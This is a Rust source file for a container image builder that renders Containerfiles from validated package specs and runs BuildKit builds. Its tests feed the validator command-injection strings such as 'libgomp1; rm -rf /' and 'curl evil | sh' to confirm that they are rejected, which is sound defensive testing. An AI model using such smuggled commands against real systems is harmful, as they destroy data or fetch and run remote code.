//! Server-side image builds from a structured spec.
//!
//! A user never hands us a Dockerfile. They describe what they want on top
//! of an allowlisted base image — apt, conda and pip packages, env vars,
//! labels, the user and working directory — and the server renders a
//! deterministic Containerfile from that spec, hands it to a BuildKit daemon
//! (`buildctl` against `AK_BUILDKIT_ADDR`, typically a rootless buildkitd
//! Deployment beside this backend), and has BuildKit push the result back
//! into this registry with a SLSA provenance attestation in `mode=max`, so
//! the exact Containerfile rides inside the image (`oci_inspect` shows it).
//!
//! The build runs as the requesting user: a short-lived API token is minted
//! for them and used as the push credential, then revoked, so repository
//! permissions apply to the push exactly as they would to `docker push`.
//!
//! Configuration is read from the environment at request time (this keeps
//! the feature entirely opt-in and leaves `Config` untouched):
//!
//! - `AK_BUILDKIT_ADDR`            — buildkitd address (`tcp://buildkitd.image-builder.svc:1234`); unset = builds disabled
//! - `AK_IMAGE_BUILD_PUSH_REGISTRY` — how buildkitd reaches THIS registry (`artifact-keeper-backend.artifact-keeper.svc:8080`); unset = builds disabled
//! - `AK_IMAGE_BUILD_REGISTRY_INSECURE` — `true` when that address is plain HTTP (default `true` for a `:8080`-style in-cluster address)
//! - `AK_IMAGE_BUILD_BASE_ALLOWLIST` — comma-separated base image prefixes; empty = any base image
//! - `AK_IMAGE_BUILD_ALLOW_RUN`     — `true` lets a spec carry raw `RUN` lines (default `false`)
//! - `AK_IMAGE_BUILD_TIMEOUT_SECS`  — per-build wall clock (default 1800)
//! - `AK_IMAGE_BUILD_MAX_CONCURRENT` — concurrent builds this backend drives (default 2)
//! - `AK_BUILDCTL_PATH`             — the buildctl binary (default `buildctl`, on PATH in the backend image)

use std::collections::BTreeMap;
use std::process::Stdio;
use std::sync::{Arc, OnceLock};
use std::time::Duration;

use base64::Engine;
use chrono::{DateTime, Utc};
use regex::Regex;
use serde::{Deserialize, Serialize};
use sqlx::PgPool;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::sync::{mpsc, Semaphore};
use utoipa::ToSchema;
use uuid::Uuid;

use crate::error::{AppError, Result};
use crate::services::auth_service::AuthService;

pub const STATUS_QUEUED: &str = "queued";
pub const STATUS_RUNNING: &str = "running";
pub const STATUS_SUCCEEDED: &str = "succeeded";
pub const STATUS_FAILED: &str = "failed";

/// Log bytes kept per build; buildctl's plain progress for a large image is
/// tens of KiB, so this is generous without letting a runaway build fill
/// the table.
const MAX_LOG_BYTES: usize = 1 << 20;
/// The label the renderer stamps the spec into, so an inspected image says
/// what it was built from even without the provenance attestation.
pub const SPEC_LABEL: &str = "dev.artifact-keeper/build-spec";

// ---------------------------------------------------------------------------
// Spec
// ---------------------------------------------------------------------------

/// What a user asks for. Every list is optional; a spec with only a base
/// image is a legal (if pointless) retag.
#[derive(Debug, Clone, Default, Serialize, Deserialize, ToSchema, PartialEq, Eq)]
pub struct ImageBuildSpec {
    /// The image to build on (`rayproject/ray:2.56.0`); must match the
    /// administrator's base allowlist when one is configured.
    pub base_image: String,
    /// Debian/Ubuntu packages (`libgomp1`, `git=1:2.43.0-1`). Installing needs
    /// root, so a spec with apt packages must also set `user`.
    #[serde(default)]
    pub apt: Vec<String>,
    /// conda packages (`samtools=1.20`), installed with `conda install`.
    #[serde(default)]
    pub conda: Vec<String>,
    /// Extra conda channels (`conda-forge`, `bioconda`).
    #[serde(default)]
    pub conda_channels: Vec<String>,
    /// pip requirement specifiers (`scanpy==1.10.2`, `polars>=1.9`).
    #[serde(default)]
    pub pip: Vec<String>,
    /// Environment variables baked into the image.
    #[serde(default)]
    pub env: BTreeMap<String, String>,
    /// OCI labels baked into the image.
    #[serde(default)]
    pub labels: BTreeMap<String, String>,
    /// The user the image runs as (`ray`, `1000`, `1000:100`). Required
    /// when apt packages are installed (they run as root).
    #[serde(default)]
    pub user: Option<String>,
    /// Working directory the image starts in.
    #[serde(default)]
    pub workdir: Option<String>,
    /// Raw `RUN` lines. Refused unless the administrator set
    /// `AK_IMAGE_BUILD_ALLOW_RUN=true`.
    #[serde(default)]
    pub run: Vec<String>,
}

#[derive(Debug, Clone)]
pub struct ImageBuildSettings {
    pub buildkit_addr: Option<String>,
    pub buildctl_path: String,
    pub push_registry: Option<String>,
    pub registry_insecure: bool,
    pub base_allowlist: Vec<String>,
    pub allow_run: bool,
    pub timeout: Duration,
    pub max_concurrent: usize,
}

impl ImageBuildSettings {
    pub fn from_env() -> Self {
        let var = |k: &str| {
            std::env::var(k)
                .ok()
                .map(|v| v.trim().to_string())
                .filter(|v| !v.is_empty())
        };
        let truthy = |v: Option<String>, default: bool| {
            v.map(|s| matches!(s.to_ascii_lowercase().as_str(), "1" | "true" | "yes" | "on"))
                .unwrap_or(default)
        };
        let push_registry = var("AK_IMAGE_BUILD_PUSH_REGISTRY");
        let insecure_default = push_registry
            .as_deref()
            .map(|h| !h.starts_with("https://") && (h.contains(':') || h.starts_with("http://")))
            .unwrap_or(false);
        Self {
            buildkit_addr: var("AK_BUILDKIT_ADDR"),
            buildctl_path: var("AK_BUILDCTL_PATH").unwrap_or_else(|| "buildctl".to_string()),
            push_registry: push_registry.map(|h| {
                h.trim_start_matches("https://")
                    .trim_start_matches("http://")
                    .trim_end_matches('/')
                    .to_string()
            }),
            registry_insecure: truthy(var("AK_IMAGE_BUILD_REGISTRY_INSECURE"), insecure_default),
            base_allowlist: var("AK_IMAGE_BUILD_BASE_ALLOWLIST")
                .map(|s| {
                    s.split(',')
                        .map(|p| p.trim().to_string())
                        .filter(|p| !p.is_empty())
                        .collect()
                })
                .unwrap_or_default(),
            allow_run: truthy(var("AK_IMAGE_BUILD_ALLOW_RUN"), false),
            timeout: Duration::from_secs(
                var("AK_IMAGE_BUILD_TIMEOUT_SECS")
                    .and_then(|v| v.parse().ok())
                    .unwrap_or(1800),
            ),
            max_concurrent: var("AK_IMAGE_BUILD_MAX_CONCURRENT")
                .and_then(|v| v.parse().ok())
                .filter(|n| *n > 0)
                .unwrap_or(2),
        }
    }

    pub fn enabled(&self) -> bool {
        self.buildkit_addr.is_some() && self.push_registry.is_some()
    }
}

// ---------------------------------------------------------------------------
// Validation and rendering
// ---------------------------------------------------------------------------

fn re(cell: &'static OnceLock<Regex>, pattern: &str) -> &'static Regex {
    cell.get_or_init(|| Regex::new(pattern).expect("static regex"))
}

static IMAGE_REF_RE: OnceLock<Regex> = OnceLock::new();
static PIP_RE: OnceLock<Regex> = OnceLock::new();
static APT_RE: OnceLock<Regex> = OnceLock::new();
static CONDA_RE: OnceLock<Regex> = OnceLock::new();
static CHANNEL_RE: OnceLock<Regex> = OnceLock::new();
static ENV_KEY_RE: OnceLock<Regex> = OnceLock::new();
static LABEL_KEY_RE: OnceLock<Regex> = OnceLock::new();
static USER_RE: OnceLock<Regex> = OnceLock::new();
static NAME_RE: OnceLock<Regex> = OnceLock::new();
static TAG_RE: OnceLock<Regex> = OnceLock::new();

fn image_ref_re() -> &'static Regex {
    re(
        &IMAGE_REF_RE,
        r"^[a-z0-9]+(?:[._-][a-z0-9]+)*(?::[0-9]+)?(?:/[a-z0-9]+(?:[._-][a-z0-9]+)*)*(?::[A-Za-z0-9_][A-Za-z0-9._-]{0,127})?(?:@sha256:[a-f0-9]{64})?$",
    )
}
fn pip_re() -> &'static Regex {
    re(
        &PIP_RE,
        r"^[A-Za-z0-9][A-Za-z0-9._-]*(?:\[[A-Za-z0-9._,\s-]+\])?(?:\s*(?:===|==|~=|!=|<=|>=|<|>)\s*[A-Za-z0-9._*+!-]+(?:\s*,\s*(?:===|==|~=|!=|<=|>=|<|>)\s*[A-Za-z0-9._*+!-]+)*)?$",
    )
}
fn apt_re() -> &'static Regex {
    re(&APT_RE, r"^[a-z0-9][a-z0-9.+-]*(?:=[A-Za-z0-9.:~+-]+)?$")
}
fn conda_re() -> &'static Regex {
    re(
        &CONDA_RE,
        r"^[A-Za-z0-9][A-Za-z0-9._-]*(?:(?:==|=|>=|<=|>|<|!=)[A-Za-z0-9._*|,<>=!]+)?$",
    )
}
fn channel_re() -> &'static Regex {
    re(&CHANNEL_RE, r"^[A-Za-z0-9][A-Za-z0-9._/-]*$")
}
fn env_key_re() -> &'static Regex {
    re(&ENV_KEY_RE, r"^[A-Za-z_][A-Za-z0-9_]*$")
}
fn label_key_re() -> &'static Regex {
    re(&LABEL_KEY_RE, r"^[A-Za-z0-9][A-Za-z0-9._/-]*$")
}
fn user_re() -> &'static Regex {
    re(
        &USER_RE,
        r"^[A-Za-z_][A-Za-z0-9_-]*(?::[A-Za-z0-9_-]+)?$|^[0-9]+(?::[0-9]+)?$",
    )
}
/// A repository path component (`ray/team`), as the distribution spec allows.
pub fn image_name_re() -> &'static Regex {
    re(
        &NAME_RE,
        r"^[a-z0-9]+(?:(?:[._]|__|-+)[a-z0-9]+)*(?:/[a-z0-9]+(?:(?:[._]|__|-+)[a-z0-9]+)*)*$",
    )
}
pub fn tag_re() -> &'static Regex {
    re(&TAG_RE, r"^[A-Za-z0-9_][A-Za-z0-9._-]{0,127}$")
}

fn invalid(msg: impl Into<String>) -> AppError {
    AppError::Validation(msg.into())
}

/// Refuse anything the renderer could not turn into a safe Containerfile
/// line, and anything the administrator's policy forbids. Returns warnings
/// worth showing next to the rendered file.
pub fn validate_spec(spec: &ImageBuildSpec, settings: &ImageBuildSettings) -> Result<Vec<String>> {
    let mut warnings = Vec::new();
    let base = spec.base_image.trim();
    if base.is_empty() {
        return Err(invalid("base_image is required"));
    }
    if !image_ref_re().is_match(base) {
        return Err(invalid(format!(
            "base_image {base:?} is not a valid image reference"
        )));
    }
    if !settings.base_allowlist.is_empty()
        && !settings
            .base_allowlist
            .iter()
            .any(|p| base.starts_with(p.as_str()))
    {
        return Err(invalid(format!(
            "base_image {base:?} is not under an allowed prefix ({})",
            settings.base_allowlist.join(", ")
        )));
    }
    if !base.contains(':') && !base.contains('@') {
        warnings.push("base_image has no tag: `latest` is implied and moves under you".to_string());
    }
    for p in &spec.apt {
        if !apt_re().is_match(p) {
            return Err(invalid(format!(
                "apt package {p:?} is not a valid Debian package spec"
            )));
        }
    }
    for p in &spec.conda {
        if !conda_re().is_match(p) {
            return Err(invalid(format!(
                "conda package {p:?} is not a valid conda match spec"
            )));
        }
    }
    for c in &spec.conda_channels {
        if !channel_re().is_match(c) {
            return Err(invalid(format!(
                "conda channel {c:?} is not a valid channel name"
            )));
        }
    }
    for p in &spec.pip {
        if !pip_re().is_match(p.trim()) {
            return Err(invalid(format!(
                "pip requirement {p:?} is not a valid requirement specifier (name[extras]==version)"
            )));
        }
        if !p.contains("==") && !p.contains("===") {
            warnings.push(format!(
                "pip requirement {p:?} is not pinned to an exact version"
            ));
        }
    }
    for (k, v) in &spec.env {
        if !env_key_re().is_match(k) {
            return Err(invalid(format!(
                "env name {k:?} is not a valid environment variable name"
            )));
        }
        if v.contains('\n') || v.contains('\r') {
            return Err(invalid(format!("env {k} must not contain a newline")));
        }
    }
    for (k, v) in &spec.labels {
        if !label_key_re().is_match(k) {
            return Err(invalid(format!("label {k:?} is not a valid label key")));
        }
        if v.contains('\n') || v.contains('\r') {
            return Err(invalid(format!("label {k} must not contain a newline")));
        }
        if k == SPEC_LABEL {
            return Err(invalid(format!("label {k} is reserved for the builder")));
        }
    }
    if let Some(u) = spec.user.as_deref() {
        if !user_re().is_match(u) {
            return Err(invalid(format!("user {u:?} is not a valid user[:group]")));
        }
    }
    if let Some(w) = spec.workdir.as_deref() {
        if !w.starts_with('/') || w.chars().any(|c| c.is_control() || c == '"' || c == '\\') {
            return Err(invalid(format!(
                "workdir {w:?} must be an absolute path without quotes"
            )));
        }
    }
    if !spec.apt.is_empty() && spec.user.is_none() {
        return Err(invalid(
            "apt packages install as root; set `user` to the account the image should run as afterwards",
        ));
    }
    if !spec.run.is_empty() {
        if !settings.allow_run {
            return Err(invalid(
                "raw RUN lines are not enabled on this instance (AK_IMAGE_BUILD_ALLOW_RUN)",
            ));
        }
        for r in &spec.run {
            if r.contains('\n') || r.trim().is_empty() {
                return Err(invalid("RUN lines must be single non-empty lines"));
            }
        }
        warnings.push(
            "raw RUN lines are not reviewed by the builder; the scan gate is your check"
                .to_string(),
        );
    }
    Ok(warnings)
}

/// Double-quote a value for a Dockerfile `ENV`/`LABEL` line.
fn dq(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '$' => out.push_str("\\$"),
            _ => out.push(c),
        }
    }
    out.push('"');
    out
}

/// Single-quote a package spec for a shell `RUN` line. Validation already
/// bounds the alphabet; the quoting is belt and braces.
fn sq(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Render the Containerfile for a validated spec. Deterministic: the same
/// spec always yields the same bytes, so the preview a user approved is
/// exactly what gets built.
pub fn render_containerfile(spec: &ImageBuildSpec) -> String {
    let mut out = String::new();
    out.push_str("# syntax=docker/dockerfile:1\n");
    out.push_str("# Generated by Artifact Keeper's image builder from a structured spec.\n");
    out.push_str("# Do not edit: change the spec and rebuild.\n");
    out.push_str(&format!("FROM {}\n", spec.base_image.trim()));
    let switch_user = !spec.apt.is_empty();
    if switch_user {
        out.push_str("USER root\n");
        out.push_str("RUN apt-get update \\\n    && apt-get install -y --no-install-recommends");
        for p in &spec.apt {
            out.push_str(" \\\n        ");
            out.push_str(&sq(p));
        }
        out.push_str(" \\\n    && rm -rf /var/lib/apt/lists/*\n");
    }
    if !spec.conda.is_empty() {
        out.push_str("RUN conda install -y");
        for c in &spec.conda_channels {
            out.push_str(&format!(" -c {}", sq(c)));
        }
        for p in &spec.conda {
            out.push_str(" \\\n        ");
            out.push_str(&sq(p));
        }
        out.push_str(" \\\n    && conda clean -afy\n");
    }
    if !spec.pip.is_empty() {
        out.push_str("RUN pip install --no-cache-dir");
        for p in &spec.pip {
            out.push_str(" \\\n        ");
            out.push_str(&sq(p.trim()));
        }
        out.push('\n');
    }
    for r in &spec.run {
        out.push_str(&format!("RUN {}\n", r.trim()));
    }
    for (k, v) in &spec.env {
        out.push_str(&format!("ENV {}={}\n", k, dq(v)));
    }
    for (k, v) in &spec.labels {
        out.push_str(&format!("LABEL {}={}\n", dq(k), dq(v)));
    }
    let spec_json = serde_json::to_string(spec).unwrap_or_default();
    out.push_str(&format!("LABEL {}={}\n", dq(SPEC_LABEL), dq(&spec_json)));
    if let Some(w) = spec.workdir.as_deref() {
        out.push_str(&format!("WORKDIR {}\n", w));
    }
    if let Some(u) = spec.user.as_deref() {
        out.push_str(&format!("USER {}\n", u));
    }
    out
}

// ---------------------------------------------------------------------------
// Persistence
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, sqlx::FromRow)]
pub struct ImageBuildRecord {
    pub id: Uuid,
    pub repository_id: Uuid,
    pub image: String,
    pub tag: String,
    pub spec: serde_json::Value,
    pub containerfile: String,
    pub status: String,
    pub digest: Option<String>,
    pub error: Option<String>,
    pub requested_by: Option<Uuid>,
    pub requested_by_name: String,
    pub created_at: DateTime<Utc>,
    pub started_at: Option<DateTime<Utc>>,
    pub finished_at: Option<DateTime<Utc>>,
    pub log_bytes: i32,
}

const RECORD_COLUMNS: &str = "id, repository_id, image, tag, spec, containerfile, status, digest, error, requested_by, requested_by_name, created_at, started_at, finished_at, octet_length(log)::int AS log_bytes";

/// What `ImageBuildStore::insert` records for a queued build.
pub struct NewImageBuild<'a> {
    pub repository_id: Uuid,
    pub image: &'a str,
    pub tag: &'a str,
    pub spec: &'a ImageBuildSpec,
    pub containerfile: &'a str,
    pub requested_by: Option<Uuid>,
    pub requested_by_name: &'a str,
}

pub struct ImageBuildStore<'a> {
    db: &'a PgPool,
}

impl<'a> ImageBuildStore<'a> {
    pub fn new(db: &'a PgPool) -> Self {
        Self { db }
    }

    pub async fn insert(&self, new: NewImageBuild<'_>) -> Result<ImageBuildRecord> {
        let spec_json = serde_json::to_value(new.spec)?;
        let row = sqlx::query_as::<_, ImageBuildRecord>(sqlx::AssertSqlSafe(&*format!(
            "INSERT INTO image_builds (repository_id, image, tag, spec, containerfile, requested_by, requested_by_name)
             VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING {RECORD_COLUMNS}"
        )))
        .bind(new.repository_id)
        .bind(new.image)
        .bind(new.tag)
        .bind(spec_json)
        .bind(new.containerfile)
        .bind(new.requested_by)
        .bind(new.requested_by_name)
        .fetch_one(self.db)
        .await?;
        Ok(row)
    }

    pub async fn list(&self, repository_id: Uuid, limit: i64) -> Result<Vec<ImageBuildRecord>> {
        Ok(sqlx::query_as::<_, ImageBuildRecord>(sqlx::AssertSqlSafe(&*format!(
            "SELECT {RECORD_COLUMNS} FROM image_builds WHERE repository_id = $1 ORDER BY created_at DESC LIMIT $2"
        )))
        .bind(repository_id)
        .bind(limit)
        .fetch_all(self.db)
        .await?)
    }

    pub async fn get(&self, repository_id: Uuid, id: Uuid) -> Result<Option<ImageBuildRecord>> {
        Ok(
            sqlx::query_as::<_, ImageBuildRecord>(sqlx::AssertSqlSafe(&*format!(
                "SELECT {RECORD_COLUMNS} FROM image_builds WHERE repository_id = $1 AND id = $2"
            )))
            .bind(repository_id)
            .bind(id)
            .fetch_optional(self.db)
            .await?,
        )
    }

    pub async fn log(&self, repository_id: Uuid, id: Uuid) -> Result<Option<String>> {
        Ok(sqlx::query_scalar::<_, String>(
            "SELECT log FROM image_builds WHERE repository_id = $1 AND id = $2",
        )
        .bind(repository_id)
        .bind(id)
        .fetch_optional(self.db)
        .await?)
    }

    async fn mark_running(&self, id: Uuid) -> Result<()> {
        sqlx::query("UPDATE image_builds SET status = $2, started_at = NOW() WHERE id = $1")
            .bind(id)
            .bind(STATUS_RUNNING)
            .execute(self.db)
            .await?;
        Ok(())
    }

    async fn append_log(&self, id: Uuid, chunk: &str) -> Result<()> {
        sqlx::query("UPDATE image_builds SET log = left(log || $2, $3) WHERE id = $1")
            .bind(id)
            .bind(chunk)
            .bind(MAX_LOG_BYTES as i32)
            .execute(self.db)
            .await?;
        Ok(())
    }

    async fn finish(
        &self,
        id: Uuid,
        status: &str,
        digest: Option<&str>,
        error: Option<&str>,
    ) -> Result<()> {
        sqlx::query(
            "UPDATE image_builds SET status = $2, digest = $3, error = $4, finished_at = NOW() WHERE id = $1",
        )
        .bind(id)
        .bind(status)
        .bind(digest)
        .bind(error)
        .execute(self.db)
        .await?;
        Ok(())
    }

    async fn pushed_digest(
        &self,
        repository_id: Uuid,
        image: &str,
        tag: &str,
    ) -> Result<Option<String>> {
        Ok(sqlx::query_scalar::<_, String>(
            "SELECT manifest_digest FROM oci_tags WHERE repository_id = $1 AND name = $2 AND tag = $3",
        )
        .bind(repository_id)
        .bind(image)
        .bind(tag)
        .fetch_optional(self.db)
        .await?)
    }
}

// ---------------------------------------------------------------------------
// Running a build
// ---------------------------------------------------------------------------

static BUILD_SLOTS: OnceLock<Arc<Semaphore>> = OnceLock::new();

fn build_slots(max: usize) -> Arc<Semaphore> {
    BUILD_SLOTS
        .get_or_init(|| Arc::new(Semaphore::new(max)))
        .clone()
}

/// Everything a queued build needs to run detached from the request.
pub struct BuildJob {
    pub db: PgPool,
    pub config: Arc<crate::config::Config>,
    pub settings: ImageBuildSettings,
    pub record: ImageBuildRecord,
    pub repository_key: String,
    pub user_id: Uuid,
    pub username: String,
}

/// The image reference buildkitd pushes to, as this registry's OCI API
/// names it: `<push host>/<repo key>/<image>:<tag>`.
pub fn push_reference(push_registry: &str, repo_key: &str, image: &str, tag: &str) -> String {
    format!("{push_registry}/{repo_key}/{image}:{tag}")
}

/// The docker `config.json` that lets buildkitd push as the requesting
/// user: Basic `<username>:<api token>`, which this registry's OCI auth
/// accepts (the token identifies the user; the username is informational).
pub fn docker_config_json(push_registry: &str, username: &str, token: &str) -> String {
    let auth = base64::engine::general_purpose::STANDARD.encode(format!("{username}:{token}"));
    serde_json::json!({ "auths": { push_registry: { "auth": auth } } }).to_string()
}

/// The buildctl invocation for a build.
pub fn buildctl_args(
    settings: &ImageBuildSettings,
    context_dir: &str,
    push_ref: &str,
) -> Vec<String> {
    let mut output = format!("type=image,name={push_ref},push=true,oci-mediatypes=true");
    if settings.registry_insecure {
        output.push_str(",registry.insecure=true");
    }
    vec![
        "--addr".to_string(),
        settings.buildkit_addr.clone().unwrap_or_default(),
        "build".to_string(),
        "--progress".to_string(),
        "plain".to_string(),
        "--frontend".to_string(),
        "dockerfile.v0".to_string(),
        "--local".to_string(),
        format!("context={context_dir}"),
        "--local".to_string(),
        format!("dockerfile={context_dir}"),
        "--opt".to_string(),
        "attest:provenance=mode=max".to_string(),
        "--output".to_string(),
        output,
    ]
}

/// Drive one build to completion, writing progress to the row. Never
/// returns an error to the caller (there is none — it runs detached); every
/// failure lands on the row as `status = failed` with `error` set.
pub async fn run_build(job: BuildJob) {
    let id = job.record.id;
    let store = ImageBuildStore::new(&job.db);
    let slots = build_slots(job.settings.max_concurrent);
    let _permit = match slots.acquire_owned().await {
        Ok(p) => p,
        Err(_) => {
            let _ = store
                .finish(id, STATUS_FAILED, None, Some("build queue closed"))
                .await;
            return;
        }
    };
    if let Err(e) = store.mark_running(id).await {
        tracing::warn!(build = %id, "image build: could not mark running: {e}");
    }
    match run_build_inner(&job, &store).await {
        Ok(digest) => {
            let _ = store
                .append_log(
                    id,
                    &format!(
                        "\n== pushed {} ==\n",
                        digest.as_deref().unwrap_or("(digest unknown)")
                    ),
                )
                .await;
            let _ = store
                .finish(id, STATUS_SUCCEEDED, digest.as_deref(), None)
                .await;
        }
        Err(e) => {
            let msg = e.to_string();
            let _ = store
                .append_log(id, &format!("\n== build failed: {msg} ==\n"))
                .await;
            let _ = store.finish(id, STATUS_FAILED, None, Some(&msg)).await;
        }
    }
}

async fn run_build_inner(job: &BuildJob, store: &ImageBuildStore<'_>) -> Result<Option<String>> {
    let settings = &job.settings;
    let push_registry = settings.push_registry.as_deref().ok_or_else(|| {
        AppError::ServiceUnavailable("image builds are not configured".to_string())
    })?;
    let workdir = tempfile::Builder::new()
        .prefix("ak-image-build-")
        .tempdir()
        .map_err(|e| AppError::Internal(format!("temp dir: {e}")))?;
    let context_dir = workdir.path().join("context");
    let config_dir = workdir.path().join("docker");
    tokio::fs::create_dir_all(&context_dir).await?;
    tokio::fs::create_dir_all(&config_dir).await?;
    tokio::fs::write(
        context_dir.join("Dockerfile"),
        job.record.containerfile.as_bytes(),
    )
    .await?;

    // The push credential: a short-lived API token for the requesting user,
    // revoked when the build ends whatever happened.
    let auth_service = AuthService::new(job.db.clone(), job.config.clone());
    let (token, token_id) = auth_service
        .generate_api_token(
            job.user_id,
            &format!("image-build {}", job.record.id),
            vec!["write:artifacts".to_string(), "read:artifacts".to_string()],
            Some(1),
        )
        .await?;
    let revoke = || async {
        if let Err(e) = auth_service.revoke_api_token(token_id, job.user_id).await {
            tracing::warn!(build = %job.record.id, "image build: could not revoke push token: {e}");
        }
    };
    tokio::fs::write(
        config_dir.join("config.json"),
        docker_config_json(push_registry, &job.username, &token),
    )
    .await?;

    let push_ref = push_reference(
        push_registry,
        &job.repository_key,
        &job.record.image,
        &job.record.tag,
    );
    let args = buildctl_args(settings, &context_dir.to_string_lossy(), &push_ref);
    store
        .append_log(
            job.record.id,
            &format!(
                "== image build {} ==\nbase: {}\ntarget: {}\nbuildkit: {}\n\n",
                job.record.id,
                job.record
                    .spec
                    .get("base_image")
                    .and_then(|v| v.as_str())
                    .unwrap_or("?"),
                push_ref,
                settings.buildkit_addr.as_deref().unwrap_or("?")
            ),
        )
        .await?;

    let mut child = match tokio::process::Command::new(&settings.buildctl_path)
        .args(&args)
        .env("DOCKER_CONFIG", &config_dir)
        .env(
            "BUILDKIT_HOST",
            settings.buildkit_addr.as_deref().unwrap_or_default(),
        )
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true)
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            revoke().await;
            return Err(AppError::ServiceUnavailable(format!(
                "could not start {}: {e}",
                settings.buildctl_path
            )));
        }
    };

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();
    if let Some(out) = child.stdout.take() {
        let tx = tx.clone();
        tokio::spawn(async move {
            let mut lines = BufReader::new(out).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                if tx.send(line).is_err() {
                    break;
                }
            }
        });
    }
    if let Some(err) = child.stderr.take() {
        tokio::spawn(async move {
            let mut lines = BufReader::new(err).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                if tx.send(line).is_err() {
                    break;
                }
            }
        });
    }

    // Pump lines into the row roughly once a second so the UI can follow.
    let deadline = tokio::time::Instant::now() + settings.timeout;
    let mut pending = String::new();
    let mut flush_tick = tokio::time::interval(Duration::from_secs(1));
    // `Child::wait` is cancellation-safe, so it can be re-created on every
    // select iteration; the timeout arm then still owns `child` to kill it.
    let status = loop {
        tokio::select! {
            line = rx.recv() => {
                if let Some(l) = line { pending.push_str(&l); pending.push('\n'); }
            }
            _ = flush_tick.tick() => {
                if !pending.is_empty() {
                    store.append_log(job.record.id, &pending).await?;
                    pending.clear();
                }
            }
            res = child.wait() => {
                break res;
            }
            _ = tokio::time::sleep_until(deadline) => {
                let _ = child.start_kill();
                revoke().await;
                return Err(AppError::Internal(format!(
                    "build exceeded {} seconds and was stopped",
                    settings.timeout.as_secs()
                )));
            }
        }
    };
    // Drain whatever the readers still hold.
    rx.close();
    while let Some(l) = rx.recv().await {
        pending.push_str(&l);
        pending.push('\n');
    }
    if !pending.is_empty() {
        store.append_log(job.record.id, &pending).await?;
    }
    revoke().await;
    let status = status.map_err(|e| AppError::Internal(format!("waiting for buildctl: {e}")))?;
    if !status.success() {
        return Err(AppError::Internal(format!(
            "buildctl exited with {}",
            status
                .code()
                .map(|c| c.to_string())
                .unwrap_or_else(|| "a signal".to_string())
        )));
    }
    store
        .pushed_digest(job.record.repository_id, &job.record.image, &job.record.tag)
        .await
}

#[cfg(test)]
mod tests {
    use super::*;

    fn settings() -> ImageBuildSettings {
        ImageBuildSettings {
            buildkit_addr: Some("tcp://buildkitd:1234".into()),
            buildctl_path: "buildctl".into(),
            push_registry: Some("registry:8080".into()),
            registry_insecure: true,
            base_allowlist: vec!["rayproject/".into(), "registry:8080/".into()],
            allow_run: false,
            timeout: Duration::from_secs(60),
            max_concurrent: 1,
        }
    }

    fn spec() -> ImageBuildSpec {
        ImageBuildSpec {
            base_image: "rayproject/ray:2.56.0".into(),
            apt: vec!["libgomp1".into()],
            conda: vec!["samtools=1.20".into()],
            conda_channels: vec!["bioconda".into(), "conda-forge".into()],
            pip: vec!["scanpy==1.10.2".into(), "polars>=1.9".into()],
            env: BTreeMap::from([
                ("OMP_NUM_THREADS".into(), "1".into()),
                ("GREETING".into(), "say \"hi\" $USER".into()),
            ]),
            labels: BTreeMap::from([("team".into(), "a".into())]),
            user: Some("ray".into()),
            workdir: Some("/home/ray".into()),
            run: vec![],
        }
    }

    #[test]
    fn renders_a_deterministic_containerfile() {
        let s = spec();
        let a = render_containerfile(&s);
        let b = render_containerfile(&s);
        assert_eq!(a, b);
        assert!(a.starts_with("# syntax=docker/dockerfile:1\n"));
        assert!(a.contains("FROM rayproject/ray:2.56.0\n"));
        assert!(a.contains("USER root\nRUN apt-get update"));
        assert!(a.contains("'libgomp1'"));
        assert!(a.contains("RUN conda install -y -c 'bioconda' -c 'conda-forge'"));
        assert!(a.contains("RUN pip install --no-cache-dir \\\n        'scanpy==1.10.2' \\\n        'polars>=1.9'\n"));
        assert!(a.contains("ENV GREETING=\"say \\\"hi\\\" \\$USER\"\n"));
        assert!(a.contains("ENV OMP_NUM_THREADS=\"1\"\n"));
        assert!(a.contains("LABEL \"team\"=\"a\"\n"));
        assert!(a.contains(&format!("LABEL \"{SPEC_LABEL}\"=")));
        assert!(a.ends_with("WORKDIR /home/ray\nUSER ray\n"));
        // Only the spec label rides an otherwise-empty spec.
        let minimal = render_containerfile(&ImageBuildSpec {
            base_image: "python:3.12-slim".into(),
            ..Default::default()
        });
        assert_eq!(minimal.matches("\nRUN ").count(), 0);
        assert!(!minimal.contains("USER "));
    }

    #[test]
    fn validation_mirrors_policy_and_shell_safety() {
        let st = settings();
        let warnings = validate_spec(&spec(), &st).unwrap();
        assert_eq!(
            warnings,
            vec!["pip requirement \"polars>=1.9\" is not pinned to an exact version"]
        );

        let bad = |f: fn(&mut ImageBuildSpec)| {
            let mut s = spec();
            f(&mut s);
            validate_spec(&s, &st)
                .err()
                .map(|e| e.to_string())
                .unwrap_or_default()
        };
        assert!(
            bad(|s| s.base_image = "docker.io/library/nginx:1".into()).contains("allowed prefix")
        );
        assert!(bad(|s| s.base_image = "bad image".into()).contains("not a valid image reference"));
        assert!(bad(|s| s.apt = vec!["libgomp1; rm -rf /".into()]).contains("apt package"));
        assert!(bad(|s| s.pip = vec!["scanpy && curl evil".into()]).contains("pip requirement"));
        assert!(bad(|s| s.conda = vec!["x`y`".into()]).contains("conda package"));
        assert!(bad(|s| {
            s.env.insert("1BAD".into(), "x".into());
        })
        .contains("env name"));
        assert!(bad(|s| {
            s.env.insert("OK".into(), "a\nb".into());
        })
        .contains("newline"));
        assert!(bad(|s| {
            s.labels.insert(SPEC_LABEL.into(), "x".into());
        })
        .contains("reserved"));
        assert!(bad(|s| s.user = Some("ray; whoami".into())).contains("user"));
        assert!(bad(|s| s.workdir = Some("relative".into())).contains("workdir"));
        assert!(bad(|s| s.user = None).contains("apt packages install as root"));
        assert!(bad(|s| s.run = vec!["curl evil | sh".into()]).contains("not enabled"));

        let mut permissive = st.clone();
        permissive.allow_run = true;
        permissive.base_allowlist.clear();
        let mut s = spec();
        s.run = vec!["echo ok".into()];
        s.base_image = "python".into();
